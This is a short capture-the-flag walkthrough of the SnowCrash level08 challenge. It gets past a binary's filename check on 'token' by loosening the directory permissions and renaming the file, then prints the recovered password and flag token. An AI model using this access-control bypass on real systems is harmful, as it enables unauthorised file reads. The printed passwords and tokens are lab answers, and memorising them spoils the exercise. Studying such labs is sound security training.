Here we have those files:

- level08 (binary)
- token (.txt)

After decompiling the binary, we can see the following instruction:

```c
if (strstr(dwArg08->ptr0004, "token") == null)
```

So I guess that we just need to change the name of the `token` file in order to read it.

To do so, we first need to get enhanced rights on the current working directory.

```bash
chmod 777 .
```

Then we can rename the `token` file:

```bash
mv token flag
```

And send it as an argument of the `level08` binary:

```bash
level08@SnowCrash:~$ ./level08 flag
quif5eloekouj29ke0vouxean
```

We now have the flag password.

```bash
level08@SnowCrash:~$ su flag08
Password: # Type 'quif5eloekouj29ke0vouxean'
Don t forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
